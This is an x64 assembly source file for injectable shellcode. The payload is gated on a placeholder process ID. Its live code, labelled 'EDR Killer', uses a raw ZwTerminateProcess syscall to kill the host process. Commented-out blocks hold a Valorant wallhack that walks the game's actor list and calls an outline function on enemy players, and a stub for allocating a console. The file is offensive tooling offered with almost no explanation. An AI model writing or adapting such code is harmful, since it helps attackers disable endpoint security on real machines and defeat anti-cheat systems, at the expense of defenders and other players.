.code
Shellcode PROC
	push rbx
	push rax
	push rcx
	push r8
	push r10
	push r11
	push r12
	push r13
	push r14
	push r15
	mov rbx, gs:[30h] ; TEB
	mov eax, [rbx+40h] ; pid
	cmp eax, 0DEADBEEFh
	jne exit


	;; Valorant
 	; mov rbx, [rbx+60h] ; PEB
 	; mov rbx, [rbx+18h] ; PEB->Ldr
 	; add rbx, 20h ; InMemoryOrderModuleList
 	; mov rbx, [rbx] ; first entry is main module
 	; mov r12, [rbx+20h]   ; Get the base address
    ; 
 	; mov r13, r12
 	; add r13, 0B700530h ; uworld_state
 	; mov r13, [r13]
 	; mov r13, [r13] ;uworld
 	; ;mov r13, [r13 + 01D8h] ; gameinstance
 	; mov r13, [r13 + 38h] ; persistent level
 	; test r13, r13
 	; jz exit
 	; mov r15, r13
 	; add r15, 0A0h ; actors array
 	; mov r15, [r15]
 	; test r15, r15
 	; jz exit
 	; mov r8, r13
 	; add r13, 0A8h ; actor count
 	; mov r13d, [r13]
    ; actor_loop:
    ; test r13d, r13d
    ; jz exit
    ;  
 	; test r15, r15
 	; jz exit
    ; mov r14, [r15]
    ; add r15, 8h
    ; dec r13d
 	; 
 	; test r14, r14
 	; jz actor_loop
 	; 
    ; 
 	; mov ebx, [r14 + 38h] ; unique id int 32
 	; cmp ebx, 18743553d  ; actor id player
 	; jne actor_loop ; skip non players
 	; 
 	; mov al, [r14 + 0F31h] ; was ally
 	; cmp al, 1 ; is ally
 	; je actor_loop ; skip allies
 	; 
 	; mov rcx, [r14 + 0F18h] ;MeshCosmetic3P
 	; test rcx, rcx
 	; jz actor_loop
    ; 
 	; sub rsp, 20h
 	; mov rdx, 4d
 	; mov r8, 1d ; true
 	; mov r9, r12
 	; add r9, 3E25F10h ; set outline
 	; call r9
 	; add rsp, 20h
    ; 
 	; jmp actor_loop

	;; Alloc Console
	; sub rsp, 20h
	; db 0E8h 
	; dd 0BEEFDEADh
	; add rsp, 20h

	; EDR Killer
	 mov rcx, -1 ; Current process
	 mov r10, rcx
	 mov eax, 2Ch ; ZwTerminateProcess
	 syscall

exit:
	pop r15
	pop r14
	pop r13
	pop r12
	pop r11
	pop r10
	pop r8
	pop rcx
	pop rax
	pop rbx
Shellcode ENDP
EndOfShellcode PROC
EndOfShellcode ENDP
END